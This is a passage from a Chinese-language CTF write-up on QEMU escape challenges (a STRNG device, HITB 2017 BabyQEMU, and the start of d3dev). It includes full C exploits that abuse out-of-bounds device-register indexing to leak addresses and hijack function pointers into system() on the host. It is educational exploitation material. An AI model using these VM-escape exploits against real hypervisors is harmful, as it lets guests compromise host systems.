可控，方便其他几个函数用这个 <code>opaque-&gt;addr</code> 进行利用 ，第二是 <code>v5</code> 为 <code>3</code> 的话，那么执行 <code>rand_r</code> 函数，并且参数为 <code>opaque-&gt;regs[2]</code> ， <code>v5</code> 存在且不为 <code>3</code> 的话，可以利用 <code>regs[v5]=val</code> 实现任意地址写，并且这里的索引可以溢出（可能是因为这个 <code>v5</code> 是 <code>opaque-&gt;addr</code> 来确定的？）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011543310.png" alt="image-20230301154347221" style="zoom:50%;" /><h4 id="利用思路">利用思路</h4><p>我们可以利用 <code>strng_pmio_write</code> 函数的任意写，来篡改 <code>rand_r</code> 这个函数指针，从而劫持程序的执行流，而这个函数的参数是 <code>regs[2]</code> ，我们可以利用 <code>strng_mmio_write</code> 函数来向 <code>regs[2]</code> 以及之后的内存单元写入数据（也就是布置我们的参数），泄露 <code>libc</code> 地址的话，可以用 <code>strng_pmio_read</code> 函数来进行泄露。</p><p>然后我这里采用的是弹一个计算器，其字符串为 <code>gnome-calculator</code>（执行<code>/bin/sh</code> 应该是没法交互的，可能反弹 <code>shell</code> 可以？）</p><p>补充：</p><p><code>PMIO_BASE</code> 的地址查看命令是 <code>lspci -v</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011630743.png" alt="image-20230301163055688"></p><h4 id="EXP">EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint32_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val )</span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val,addr+PMIO_BASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">   <span class="comment">//iopl函数来提升IO的等级，否则这个pmio使用的是有问题的</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x3b414141</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">0x6d6f6e67</span>);   <span class="comment">// regs[2]</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0x61632d65</span>);  <span class="comment">// regs[3]</span></span><br><span class="line">    mmio_write(<span class="number">7</span>,<span class="number">0x6c75636c</span>);  <span class="comment">// regs[4]</span></span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x726f7461</span>);  <span class="comment">// regs[5]</span></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x118</span>);<span class="comment">//set opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> high_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    <span class="type">uint64_t</span> low_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr=low_addr+(high_addr&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;low addr @ %llx\n&quot;</span>,low_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;high addr @ %llx\n&quot;</span>,high_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r function address @ %llx\n&quot;</span>,rand_r_addr);</span><br><span class="line">    <span class="type">uint64_t</span> system_addr=rand_r_addr+<span class="number">0xb080</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system function address @ %llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------tigger system----------------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0xc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011626104.png" alt="image-20230301162602101"></p><h4 id="猜测">猜测</h4><p>因为上面发现 <code>mmio_read</code> 和 <code>mmio_write</code> 函数都无法索引溢出，尽管看起来 <code>qemu-system-x86_64</code> 程序中没有做任何的检查，但尝试了一下，数组越界访问的话确实是有点问题。然后看了一个师傅的解释，大概是下面的这个意思</p><p><code>MMIO</code> 和 <code>PMIO</code> 的空间大小是由 <code>pci_xxx_realize</code> 函数中注册的。</p><p>本题这里标明了 <code>MMIO</code> 的大小是 <code>0x100</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302281045546.png" alt="image-20230228104514364"></p><p>本地的 <code>regs</code> 数组大小就是 <code>0x100</code> ，所以这里是无法通过数组溢出覆盖到下面的函数指针的。因为 <code>pci</code> 设备内部会进程检查</p><h3 id="HITB-GSEC2017-BABYQEMU">[HITB GSEC2017]BABYQEMU</h3><p>附件在 <code>buu</code> 上可以搜到</p><p>通过分析 <code>launch.sh</code> 文件得知这次的设备叫做 <code>hitb</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我用的 <code>ubuntu18.04</code> ，然后运行 <code>launch.sh</code> 的时候有如下报错</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041237815.png" alt="image-20230304123706649"></p><p>解决方法：执行 <code>sudo apt install libcurl3</code></p><p>然后发现登录上去的时候询问用户名和密码</p><p>我们用如下命令，来将 <code>rootfs.cpio</code> 文件解压缩，然后我们去 <code>etc</code> 目录下，查看 <code>shadow</code> 文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cpio -idv &lt; /home/zikh/Desktop/pwn_qemu/rootfs.cpio</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure><p>发现如果用户名为 <code>root</code> 的话，后面的密码为空（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303021733038.png" alt="image-20230302173323824"></p><p>因此在登录的时候，用户名输入为 <code>root</code> 即可登录成功（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041306416.png" alt="image-20230304130630554" style="zoom:50%;" /><h4 id="代码逆向-v2">代码逆向</h4><p>首先在 <code>hitb_class_init</code> 函数中确定设备号</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041308293.png" alt="image-20230304130826234" style="zoom:50%;" /><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041309270.png" alt="image-20230304130955192"></p><p>结合上面两个图片可以分析出 <code>00:04:0</code> 是 <code>hitb</code> 的设备号。</p><p>本题没有 <code>pmio</code> 的函数，但是有 <code>mmio</code> 的两个函数以及 <code>dma_timer</code> 。</p><p>简单分析下这三个函数</p><p>首先看 <code>hitb_mmio_read</code> 函数（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041321559.png" alt="image-20230304132100421"></p><p>这个比较明显，函数就是让你选择不同的 <code>addr</code> 然后用 <code>return</code> 返回结构体的不同字段。想显示结构体的字段的话，需要将 <code>opaque</code> 的类型改为 <code>HitbState *</code> （这是 <code>qemu</code> 逃逸的第三道题了，给我的感觉是通常漏洞都发生在数组索引越界上），这个 <code>mmio_read</code> 函数并没有用到索引来访问成员，所以这里简单看一下发现是没什么问题的。</p><p>其次是 <code>hitb_mmio_write</code> 函数（如下），这里就是让根据不同的 <code>addr</code> 然后给结构体不同的字段进行赋值，其值为 <code>val</code>。这里也没有通过数组的索引来访问成员，看起来也是安全的。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041325990.png" alt="image-20230304132554889" style="zoom: 67%;" /><p>不过这里要关注一下 <code>timer_mod</code> 函数</p><p>该函数的大致意思是说当超过 <code>expire_time</code> 这个时间时会触发定时器中断，其处理函数是 <code>ts</code> 结构体中的 <code>cb</code> 参数指定的函数，在 <code>pci_hitb_realize</code> 函数中的 <code>timer_init_tl</code> 函数里面将 <code>hitb_dma_timer</code> 函数赋值给了 <code>ts</code> 结构体中的 <code>cb</code> （ <code>call back</code> ）。因此我们添加 <code>sleep</code> 函数，让其超过 <code>expire_time</code> ，从而调用 <code>hitb_dma_timer</code> 函数</p><p>最后来看下 <code>hitb_dma_timer</code> 函数</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041434536.png" alt="image-20230304143404417"></p><p>这里就有我们心心念念的数组索引了，而且我们能够发现这里的索引 <code>v2</code> 是没有做任何检查的，并且它是被 <code>opaque-&gt;dma.src</code> 所控制，这个 <code>dma.src</code> 是在 <code>hitb_mmio_write</code> 函数可以被我们控制的，所以这里 <code>dma_buf[v2]</code> 是存在索引溢出的。</p><h4 id="利用思路-v2">利用思路</h4><p>重点看下 <code>cpu_physical_memory_rw</code> 函数</p><blockquote><p><code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,int len, int is_write)</code> 函数是 <code>QEMU</code> 虚拟机监视器中一个用于读写物理内存的函数。该函数的作用是在虚拟机中读写指定地址的物理内存，并将读取或写入的数据存储在给定的缓冲区中。它的参数如下：</p><ul><li><code>hwaddr addr</code>：一个表示物理内存地址的无符号整数类型。需要读写的物理地址。</li><li><code>uint8_t *buf</code>：一个指向要读取或写入数据的缓冲区的指针。数据存储在这里。</li><li><code>int len</code>：一个整数，表示要读取或写入数据的长度。</li><li><code>int is_write</code>：一个整数，表示操作是读取（0）还是写入（非0）操作。</li></ul></blockquote><p>以这行代码为例 <code>cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);</code>  ，其作用是将 <code>cnt_low</code> 写入物理内存 <code>opaque-&gt;dma.dst</code> 的位置（ <code>qemu</code> 中的物理内存 ）,写入的字节数为 <code>opaque-&gt;dma.cnt</code> 。</p><p><code>cnt_low</code> 是由 <code>(uint8_t *)&amp;opaque-&gt;dma_buf[v2]</code> 所赋值的，我们上面提到了 <code>dma_buf</code> 数组存在索引溢出，现在来看下比 <code>dma_buf</code> 低的位置有没有什么可用的（如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820030.png" alt="image-20230304162135975" style="zoom: 50%;" /><p>发现了 <code>dma_buf</code> 下面紧挨着的就是 <code>enc</code> 这个函数地址，因此我们可以让 <code>v2</code> 溢出，让其 <code>dma_buf[v2]</code> 指向 <code>enc</code> ，接着执行 <code>cpu_physical_memory_rw</code> 函数，这样 <code>enc</code> 函数的地址就会被写入到 <code>opaque-&gt;dma.dst</code> 指向的内存，也就是说只要让 <code>opaque-&gt;dma.dst</code> 为我们能够访问的物理内存，执行完这个函数后，我们就可以通过打印这个物理内存所对应的变量就能获取程序基地址</p><p>搜索一下发现，本题是有 <code>system</code> 函数的，所以只要拿到程序里函数的地址，用固定偏移就可以得到 <code>system</code> 函数的地址。</p><p>**注意：<code>cpu_physical_memory_rw</code> 函数的第一个参数需要的是物理地址，所以需要将 <code>qemu</code> 中的虚拟内存转换为物理地址，具体转换的方法可以参考文末的 <code>qemu</code> 中的虚拟内存与物理内存部分 **</p><p>这里的 <code>exp</code> 如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> enc_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line"><span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br></pre></td></tr></table></figure><p>这个 <code>exp</code> 先打印了我定义的 <code>enc_addr</code> 这个变量在 <code>qemu</code> 中的虚拟地址，以及在 <code>qemu</code> 中的物理地址，和变量本身的值。当执行完 <code>cpu_physical_memory_rw</code> 函数后再次打印 <code>enc_addr</code> 变量的值（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820680.png" alt="image-20230304175344273"></p><p>可以发现 <code>enc_value</code> 从最开始的 <code>0</code> 在 <code>cpu_physical_memory_rw</code> 函数执行后，变成了 <code>0x55835e3b3dd0</code> ，这个地址正是 <code>enc</code> 函数的地址。从而说明了 <code>cpu_physical_memory_rw</code> 函数可以将一个值写入到我们指定的物理内存中</p><p>如果能理解上面这个将 <code>enc</code> 函数的地址读到物理地址上的过程，那依次类推，将物理地址中的数据写回 <code>opaque-&gt;dma_buf[v2]</code> 也就很好理解了。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820582.png" alt="image-20230304201045218"></p><p>值得一提的是，如果用 <code>IDA</code> 来看这个 <code>v6</code> 后面的赋值会感觉十分难理解，这里反而看汇编会更容易理解。</p><p>汇编部分如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820277.png" alt="image-20230304201218093"></p><p>通过分析这四行汇编，发现上面给 <code>v6</code> 赋值的代码就是 <code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code></p><p>所以控制 <code>dma.dst</code> 为 <code>0x41000</code> ，此时就是 <code>dma_buf[0x1000]</code> 这个位置放的就是 <code>enc</code> 函数的地址，<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0)</code> 函数会将 <code>opaque-&gt;dma.src</code> 中的数据读入到 <code>dma_buf[0x1000]</code> 的位置，因为 <code>dma.src</code> 是物理内存地址，所以我们将 <code>system</code> 函数的物理地址写入 <code>dma.src</code> 。</p><p>最后我们依然利用一次 <code>cpu_physical_memory_rw</code> 函数来往虚拟地址中写参数（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820553.png" alt="image-20230304202531687"></p><p>此时我们的 <code>v6</code> 要写为参数的地址，这回我们不需要数组索引溢出了，因此我选择了将参数写入到 <code>opaque-&gt;dma_buf[0]</code> 的位置，然后进入 <code>(v4 &amp; 4)!=0</code> 这个分支，去调用 <code>opaque-&gt;enc((char *)v6,cnt_low)</code>  劫持执行流，调用 <code>system(&quot;cat /flag&quot;)</code></p><h4 id="EXP-v2">EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> * addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> page;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="type">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="type">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint64_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:04.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line"><span class="comment">//printf(&quot;mmio_write @ ----&gt; %p\n&quot;,mmio_write);</span></span><br><span class="line">    getchar();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line">    <span class="type">uint64_t</span> enc_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    <span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(&amp;call_system_addr));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    <span class="type">char</span> *command=<span class="string">&quot;cat /flag;cat /root/flag;cat flag;pwd&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;command address is %llx&quot;</span>,command);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(command));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x40000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="built_in">strlen</span>(command));<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">0x4</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820957.png" alt="image-20230304172709467"></p><h3 id="d3dev">d3dev</h3><h4 id="题目附件">题目附件</h4><p>链接: <a href="https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp">https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp</a> 提取码: t9gp</p><h4 id="漏洞分析">漏洞分析</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820851.png" alt="image-20230316145717263" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820351.png" alt="image-20230316145949280" style="zoom: 67%;" /><p>通过观察对比 <code>class_init</code> 函数中的数据，发现 <code>d3dev</code> 设备号为 <code>00:03.0</code></p><p>数组索引溢出漏洞位于 <code>d3dev_mmio_write</code> 函数</p><img 